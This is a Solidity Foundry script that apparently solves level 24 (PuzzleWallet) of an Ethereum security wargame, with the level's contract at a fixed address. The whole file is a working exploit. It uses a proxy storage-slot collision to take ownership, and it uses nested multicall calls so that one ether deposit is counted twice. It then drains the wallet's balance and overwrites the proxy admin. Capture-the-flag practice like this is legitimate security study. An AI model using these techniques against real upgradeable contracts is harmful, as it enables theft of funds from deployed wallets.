// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/levels/24-PuzzleWallet/PuzzleWallet.sol";

contract ExploitScript is Script {
    PuzzleWallet level24 = PuzzleWallet(payable(0x8294a685a33EdD532Fae237A7988db0B217259Cc));
    PuzzleProxy proxy = PuzzleProxy(payable(0x8294a685a33EdD532Fae237A7988db0B217259Cc));

    function run() public {
        vm.startBroadcast();
        console.log("currect owner:",level24.owner());
        console.log("currect maxBalance:",level24.maxBalance());
        console.log("currect pendingAdmin:",proxy.pendingAdmin());
        console.log("currect admin:",proxy.admin());
        // making ourselves owner of wallet
        proxy.proposeNewAdmin(msg.sender); //replace slot0
        console.log("After pendingAdmin:",proxy.pendingAdmin());
        console.log("After owner:",level24.owner()); //replace slot0

        //creating encoded function data to pass into multicall
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(level24.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(level24.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(level24.multicall.selector, depositSelector);
        //whitelisting our address
        level24.addToWhitelist(msg.sender);
        //calling multicall with nested data stored above
        level24.multicall{value: 0.001 ether}(nestedMulticall);
        //calling execute to drain the contract
        level24.execute(msg.sender, 0.002 ether, "");
        level24.setMaxBalance(uint256(uint160(msg.sender))); //relace slot1
        //making sure our exploit worked
        console.log("New Admin is : ", proxy.admin());

        vm.stopBroadcast();
    }
}